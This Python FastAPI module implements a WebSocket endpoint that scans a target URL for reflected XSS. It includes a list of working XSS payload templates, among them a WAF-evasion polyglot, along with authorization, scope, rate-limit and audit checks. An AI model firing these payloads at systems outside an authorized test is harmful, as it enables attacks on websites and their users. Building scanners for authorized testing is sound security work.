"""XSS — reflected-XSS detection with context-aware payloads.

WS  /ws/xss
    client -> server:
        {"url": "...FUZZ...", "method":"GET"|"POST", "body":"", "headers":{},
         "cookies":{}, "allow_private": false, "rate_per_sec": 8,
         "confirm_auth": true}

    server -> client:
        {"type":"started",  "url","total_payloads"}
        {"type":"attempt",  "payload","status","length","elapsed_ms","reflected","context"}
        {"type":"finding",  "severity","payload","context","evidence","confirmed"}
        {"type":"progress", "done","total","findings"}
        {"type":"done",     "elapsed","findings","stopped"}
        {"type":"error",    "detail"}
"""
from __future__ import annotations

import asyncio
import json
import logging
import time
import uuid
from urllib.parse import urlparse

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from lib import audit_log, scope, web_fuzz
from lib.errors import ErrorCode, MhpError, ws_error
from lib.mode import get_mode
from lib.validators import validate_url

logger = logging.getLogger(__name__)

router = APIRouter(tags=["xss"])

# Each payload is paired with a sentinel; we generate per-session sentinels to
# avoid collisions across runs. The {S} placeholder is replaced with the sentinel.
PAYLOAD_TEMPLATES = [
    # Classic
    "<script>alert('{S}')</script>",
    "<img src=x onerror=alert('{S}')>",
    "<svg/onload=alert('{S}')>",
    # Attribute breakout
    "\"><script>alert('{S}')</script>",
    "'><script>alert('{S}')</script>",
    "\" autofocus onfocus=alert('{S}') x=\"",
    "' autofocus onfocus=alert('{S}') x='",
    # JS string breakout
    "';alert('{S}');//",
    "\";alert('{S}');//",
    "</script><script>alert('{S}')</script>",
    # URL/href
    "javascript:alert('{S}')",
    # Polyglots (DOMpurify/WAF stress)
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{S}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{S}')//>\\x3e",
    # Mixed
    "<iframe srcdoc=\"<script>alert('{S}')</script>\">",
    "<details open ontoggle=alert('{S}')>",
    "<body onload=alert('{S}')>",
]


def _is_json_content_type(headers: dict[str, str]) -> bool:
    """True if the response Content-Type is application/json or application/*+json."""
    ct = (headers.get("content-type") or "").split(";", 1)[0].strip().lower()
    if not ct:
        return False
    if ct == "application/json":
        return True
    # application/*+json (e.g. application/vnd.api+json, application/hal+json)
    if ct.startswith("application/") and ct.endswith("+json"):
        return True
    return False


def _find_payload_in_json(node, payload: str, path: str = ""):
    """Walk a parsed JSON tree depth-first; yield (json_path, value) for every
    string value that contains the payload as a substring. Path uses dotted/
    bracketed notation: `data[0].name`."""
    if isinstance(node, dict):
        for k, v in node.items():
            child_path = f"{path}.{k}" if path else k
            yield from _find_payload_in_json(v, payload, child_path)
    elif isinstance(node, list):
        for i, v in enumerate(node):
            child_path = f"{path}[{i}]"
            yield from _find_payload_in_json(v, payload, child_path)
    elif isinstance(node, str):
        if payload in node:
            yield path or "$", node


def classify_context(body: str, payload: str) -> str:
    """Quick heuristic for where the payload landed."""
    idx = body.find(payload)
    if idx < 0:
        return "not-reflected"
    pre = body[max(0, idx - 80):idx].lower()
    post = body[idx + len(payload):idx + len(payload) + 40].lower()
    if "<script" in pre and "</script>" in post:
        return "js-block"
    if any(c in pre[-30:] for c in ("\"", "'")) and any(c in post[:5] for c in ("\"", "'", " ", ">")):
        return "html-attribute"
    if "href=" in pre[-20:] or "src=" in pre[-20:]:
        return "url-attribute"
    return "html-body"


@router.websocket("/ws/xss")
async def xss_ws(ws: WebSocket) -> None:
    await ws.accept()
    stop = asyncio.Event()
    audit_id: str | None = None

    async def listen_for_stop() -> None:
        try:
            while True:
                msg = await ws.receive_json()
                if isinstance(msg, dict) and msg.get("action") == "stop":
                    stop.set(); return
        except WebSocketDisconnect:
            stop.set()
        except Exception:
            stop.set()

    try:
        init = await ws.receive_json()
        engagement_id = init.get("engagement_id") or None
        url = str(init.get("url", "")).strip()
        try:
            url = validate_url(url, field="url")
        except MhpError as exc:
            await ws.send_json(ws_error(exc.code, exc.message))
            await ws.close(); return
        tmpl = web_fuzz.FuzzTemplate(
            url=url,
            method=str(init.get("method", "GET")).upper(),
            body=str(init.get("body", "")),
            headers=dict(init.get("headers") or {}),
            cookies=dict(init.get("cookies") or {}),
        )
        if not tmpl.has_marker():
            await ws.send_json(ws_error(
                ErrorCode.BAD_REQUEST,
                f"Place '{web_fuzz.DEFAULT_MARKER}' in the URL, body, header, or cookie value to mark where payloads go",
            ))
            await ws.close(); return

        if not bool(init.get("confirm_auth", False)):
            await ws.send_json(ws_error(
                ErrorCode.NEED_CONFIRM,
                "Confirm you have authorization to test this target before running",
            ))
            await ws.close(); return

        # Engagement scope (layered on top of web_fuzz.check_scope's
        # IP-class guard below). Extract the host from the URL so the scope
        # check matches the engagement's hostname/CIDR entries.
        confirm = bool(init.get("confirm", False))
        init_mode = str(init.get("mode", "")).strip().lower()
        mode = "engagement" if init_mode == "engagement" else (
            "lab" if init_mode == "lab" else get_mode(ws)
        )
        host_for_scope = urlparse(url).hostname or url
        if not await scope.enforce_ws(ws, host_for_scope, engagement_id, mode, confirm=confirm, active=True, action="xss"):
            return

        allow_private = bool(init.get("allow_private", False))
        ok, reason = web_fuzz.check_scope(url, allow_private)
        if not ok:
            await ws.send_json(ws_error(ErrorCode.TARGET_DENIED, reason))
            await ws.close(); return

        sentinel = "MHP" + uuid.uuid4().hex[:8]
        payloads = [tmpl_str.format(S=sentinel) for tmpl_str in PAYLOAD_TEMPLATES]
        total = len(payloads)
        rate = max(1, min(int(init.get("rate_per_sec", 8)), 30))

        try:
            audit_id = audit_log.start(
                tool="xss", target=url,
                argv=[tmpl.method, url, f"payloads={total}", f"rate={rate}/s"],
                engagement_id=engagement_id,
            )
        except Exception:
            logger.exception("audit_log.start failed (scan continues)")

        await ws.send_json({"type": "started", "url": url,
                            "total_payloads": total, "audit_id": audit_id})

        listener = asyncio.create_task(listen_for_stop())
        t0 = time.monotonic()
        done = 0
        findings = 0

        async def on_result(r: web_fuzz.FuzzResponse) -> None:
            nonlocal done, findings
            done += 1
            reflected = sentinel in r.body
            context = classify_context(r.body, r.payload) if reflected else "not-reflected"
            await ws.send_json({
                "type": "attempt", "payload": r.payload, "status": r.status,
                "length": r.length, "elapsed_ms": r.elapsed_ms,
                "reflected": reflected, "context": context,
            })
            if reflected and context != "not-reflected":
                findings += 1
                # Confirmed = full payload chars survived and we're in an executable context.
                exec_chars = any(c in r.payload for c in ("<", ">", "(", ")"))
                full_intact = r.payload in r.body
                confirmed = full_intact and exec_chars and context in (
                    "html-body", "html-attribute", "js-block",
                )
                severity = "high" if confirmed else "warn"
                evidence = r.body[max(0, r.body.find(r.payload) - 60):r.body.find(r.payload) + len(r.payload) + 60]
                await ws.send_json({
                    "type": "finding", "severity": severity,
                    "payload": r.payload, "context": context,
                    "evidence": evidence, "confirmed": confirmed,
                })
            # JSON-reflected XSS — SPA frontends (e.g. Juice Shop) often render
            # JSON responses through client-side templates. The HTML-reflection
            # check above misses these because the payload lands inside an
            # escaped JSON string value, not raw HTML. Additive only: we still
            # run after the HTML check so the existing logic is unchanged.
            elif _is_json_content_type(r.headers) and r.body:
                try:
                    parsed = json.loads(r.body)
                except (ValueError, json.JSONDecodeError):
                    parsed = None
                if parsed is not None:
                    for json_path, value in _find_payload_in_json(parsed, r.payload):
                        findings += 1
                        snippet = value if len(value) <= 100 else value[:100] + "…"
                        evidence = f"{json_path}: {snippet!r}"
                        await ws.send_json({
                            "type": "finding", "severity": "info",
                            "payload": r.payload, "context": "json-reflected",
                            "evidence": evidence, "confirmed": False,
                            "detail": "Reflected in JSON — verify manually in any client-side template render",
                        })
                        # One finding per response is enough; further matches
                        # within the same JSON tree are noise.
                        break
            if done % 2 == 0 or done == total:
                await ws.send_json({"type": "progress",
                                    "done": done, "total": total, "findings": findings})

        await web_fuzz.run_payloads(tmpl, payloads, on_result,
                                    concurrency=4, rate_per_sec=rate,
                                    stop=stop)
        listener.cancel()
        elapsed = round(time.monotonic() - t0, 2)
        await ws.send_json({"type": "done", "elapsed": elapsed,
                            "findings": findings, "stopped": stop.is_set()})
        if audit_id:
            summary = f"{findings} findings, {done}/{total} payloads, {elapsed}s"
            try:
                if stop.is_set():
                    audit_log.stopped(audit_id, summary=summary)
                else:
                    audit_log.complete(audit_id, summary=summary)
            except Exception:
                logger.exception("audit_log finalize failed")
    except WebSocketDisconnect:
        stop.set()
        if audit_id:
            try: audit_log.stopped(audit_id, summary="client disconnected")
            except Exception: pass
    except Exception as exc:
        logger.exception("xss_ws unhandled exception")
        if audit_id:
            try: audit_log.error(audit_id, f"{type(exc).__name__}: {exc}")
            except Exception: pass
        try:
            await ws.send_json(ws_error(
                ErrorCode.INTERNAL,
                "internal error during XSS scan",
            ))
        except Exception:
            pass
    finally:
        try:
            await ws.close()
        except Exception:
            pass
